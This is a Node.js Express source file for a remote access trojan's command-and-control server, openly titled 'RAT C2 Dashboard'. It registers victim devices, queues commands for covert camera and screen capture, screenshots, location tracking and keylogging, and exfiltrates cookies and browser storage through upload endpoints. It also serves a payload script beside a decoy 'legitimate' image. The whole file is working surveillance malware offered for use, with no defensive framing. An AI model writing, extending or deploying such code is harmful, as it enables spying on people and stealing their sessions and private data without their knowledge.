const express = require('express');
const multer = require('multer');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Configure multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const deviceId = req.params.deviceId;
        const dir = path.join(__dirname, 'data', deviceId);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, `${Date.now()}_${file.originalname}`);
    }
});

const upload = multer({ storage });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

let devices = {};

app.post('/register', (req, res) => {
    const deviceId = req.body.deviceId;
    if (!devices[deviceId]) {
        devices[deviceId] = {
            info: req.body,
            lastSeen: new Date(),
            commands: [],
            data: []
        };
    } else {
        devices[deviceId].lastSeen = new Date();
    }
    res.json({ success: true, deviceId });
});

app.post('/command/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    if (devices[deviceId]) {
        devices[deviceId].commands.push(req.body);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Device not found' });
    }
});

app.get('/commands/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    if (devices[deviceId]) {
        const commands = devices[deviceId].commands;
        devices[deviceId].commands = [];
        devices[deviceId].lastSeen = new Date();
        res.json(commands);
    } else {
        res.status(404).json({ error: 'Device not found' });
    }
});

app.post('/data/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    if (devices[deviceId]) {
        devices[deviceId].data.push({ ...req.body, timestamp: new Date() });
        devices[deviceId].lastSeen = new Date();
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Device not found' });
    }
});

app.post('/blob/:deviceId', upload.single('data'), (req, res) => {
    const { deviceId } = req.params;
    if (devices[deviceId]) {
        devices[deviceId].data.push({
            type: req.body.type,
            filename: req.file.filename,
            path: req.file.path,
            timestamp: new Date()
        });
        devices[deviceId].lastSeen = new Date();
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Device not found' });
    }
});

app.get('/devices', (req, res) => {
    const list = Object.keys(devices).map(id => ({
        id,
        info: devices[id].info,
        lastSeen: devices[id].lastSeen,
        commandCount: devices[id].commands.length,
        dataCount: devices[id].data.length
    }));
    res.json(list);
});

app.get('/data/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    res.json(devices[deviceId] ? devices[deviceId].data : []);
});

app.get('/file/:deviceId/:filename', (req, res) => {
    const { deviceId, filename } = req.params;
    const filePath = path.join(__dirname, 'data', deviceId, filename);
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).json({ error: 'File not found' });
    }
});

// Main dashboard HTML
app.get('/', (req, res) => {
    const deviceListHtml = Object.keys(devices).map(id => `
        <div class="device">
            <h3>${id}</h3>
            <p>Platform: ${devices[id].info.platform}</p>
            <p>Last Seen: ${new Date(devices[id].lastSeen).toLocaleString()}</p>
            <div class="command-form">
                <select id="cmd-${id}">
                    <option value="camera">Camera</option>
                    <option value="screen">Screen Share</option>
                    <option value="screenshot">Screenshot</option>
                    <option value="location">Location</option>
                    <option value="keylog">Keylogger</option>
                    <option value="exfil" data-target="cookies">Exfil Cookies</option>
                    <option value="exfil" data-target="localStorage">Exfil LocalStorage</option>
                    <option value="exfil" data-target="sessionStorage">Exfil SessionStorage</option>
                </select>
                <input type="number" id="dur-${id}" placeholder="Duration (ms)" value="10000">
                <button onclick="sendCmd('${id}')">Send</button>
            </div>
            <div class="data-view">
                <button onclick="loadData('${id}')">Refresh Data</button>
                <div id="data-${id}"></div>
            </div>
        </div>
    `).join('');

    res.send(`<!DOCTYPE html>
    <html>
    <head>
        <title>RAT C2 Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #111; color: #0f0; }
            .device { border: 1px solid #333; padding: 15px; margin: 15px 0; background: #222; border-radius: 5px; }
            .command-form button, .data-view button { background: #008000; color: #fff; border: none; padding: 8px 12px; margin: 5px 0; cursor: pointer; }
            .data-view button { background: #444; }
            pre { background: #333; padding: 10px; overflow-x: auto; max-height: 200px; }
            img { max-width: 300px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <h1>RAT C2 Dashboard</h1>
        <h2>Connected Devices: ${Object.keys(devices).length}</h2>
        <div id="devices">${deviceListHtml || '<p>No devices connected yet. Open the payload URL on a device to connect.</p>'}</div>
        <script>
            function sendCmd(id) {
                const type = document.getElementById('cmd-' + id).value;
                const dur = document.getElementById('dur-' + id).value;
                let cmd = { type, duration: parseInt(dur) };
                if (type === 'exfil') {
                    cmd.type = 'exfil';
                    cmd.target = document.getElementById('cmd-' + id).selectedOptions[0].dataset.target;
                }
                fetch('/command/' + id, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(cmd) })
                    .then(r => r.json())
                    .then(d => alert(d.success ? 'Command sent!' : 'Error'));
            }
            function loadData(id) {
                fetch('/data/' + id).then(r => r.json()).then(data => {
                    const el = document.getElementById('data-' + id);
                    if (!data.length) { el.innerHTML = '<p>No data yet</p>'; return; }
                    let html = '';
                    data.forEach(item => {
                        if (item.type === 'camera' || item.type === 'screen') {
                            html += '<p>Recording: ' + item.type + '</p><a href="/file/' + id + '/' + item.filename + '" download>Download Video</a><br>';
                        } else if (item.type === 'screenshot') {
                            html += '<p>Screenshot:</p><img src="/file/' + id + '/' + item.filename + '"><br>';
                        } else {
                            html += '<p>' + item.type + ':</p><pre>' + JSON.stringify(item.data, null, 2) + '</pre>';
                        }
                    });
                    el.innerHTML = html;
                });
            }
        </script>
    </body>
    </html>`);
});

// Create directories if they don't exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

const publicDir = path.join(__dirname, 'public');
if (!fs.existsSync(publicDir)) {
    fs.mkdirSync(publicDir, { recursive: true });
}

// Serve the main RAT page
app.get('/index.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve the RAT payload script
app.get('/rat-payload.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'rat-payload.js'));
});

// Serve the legitimate image
app.get('/legitimate-image.jpg', (req, res) => {
    res.sendFile(path.join(__dirname, 'legitimate-image.jpg'));
});

// Start server
app.listen(PORT, () => {
    console.log(`C2 Server running on http://localhost:${3000}`);
});